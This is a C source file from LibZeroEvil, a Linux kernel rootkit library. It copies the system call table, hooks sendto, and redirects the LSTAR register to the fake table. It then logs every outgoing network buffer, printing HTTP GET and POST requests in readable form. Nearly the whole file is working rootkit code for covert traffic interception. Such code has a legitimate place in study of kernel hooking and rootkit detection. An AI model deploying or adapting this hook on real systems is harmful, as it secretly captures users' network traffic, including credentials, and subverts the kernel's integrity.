// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
// proc_create, proc_remove.
# include <linux/proc_fs.h>
// __NR_syscall_max.
# include <asm-generic/asm-offsets.h>
# include <linux/syscalls.h>
// struct sockaddr.
# include <linux/socket.h>
// kmalloc, kfree.
# include <linux/slab.h>
# include <asm/uaccess.h>
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

phys_addr_t real_phys;

unsigned long *fake_sct[__NR_syscall_max] = { 0 };

asmlinkage long
fake_sendto(int fd, void __user *buff, size_t len, unsigned flags,
            struct sockaddr __user *addr, int addr_len);
asmlinkage long
(*real_sendto)(int fd, void __user *buff, size_t len, unsigned flags,
               struct sockaddr __user *addr, int addr_len);


int
init_module(void)
{
    unsigned long **real_sct;

    fm_alert("%s\n", "Greetings the World!");

    fm_alert("__NR_syscall_max: %d", __NR_syscall_max);

    real_sct = get_sct_via_sys_close();
    if (real_sct == NULL) {
        return 1;
    }

    real_phys = virt_to_phys(real_sct);
    fm_alert("real sys_call_table: %p phys: %llx\n",
             real_sct, real_phys);
    fm_alert("fake sys_call_table: %p phys: %llx\n",
             fake_sct, virt_to_phys(fake_sct));

    memcpy(fake_sct, real_sct, sizeof fake_sct);

    HOOK_SCT(fake_sct, sendto);

    set_lstar_sct((u32)(unsigned long)fake_sct);

    return 0;
}


void
cleanup_module(void)
{
    fm_alert("%s\n", "Farewell the World!");

    // There is no need to UNHOOK_SCT.
    set_lstar_sct((u32)(unsigned long)phys_to_virt_kern(real_phys));

    return;
}


asmlinkage long
fake_sendto(int fd, void __user *buff, size_t len, unsigned flags,
            struct sockaddr __user *addr, int addr_len)
{
    void *kbuf = kmalloc(len + 1, GFP_KERNEL);
    if (kbuf != NULL) {
        if (copy_from_user(kbuf, buff, len)) {
            fm_alert("%s\n", "copy_from_user failed.");
        } else {
            if (memcmp(kbuf, "GET", 3) == 0 ||
                memcmp(kbuf, "POST", 4) == 0) {
                print_ascii(kbuf, len, "ascii");
            } else {
                print_memory(kbuf, len, "memory");
            }
        }
        kfree(kbuf);
    } else {
        fm_alert("%s\n", "kmalloc failed.");
    }

    return real_sendto(fd, buff, len, flags, addr, addr_len);
}
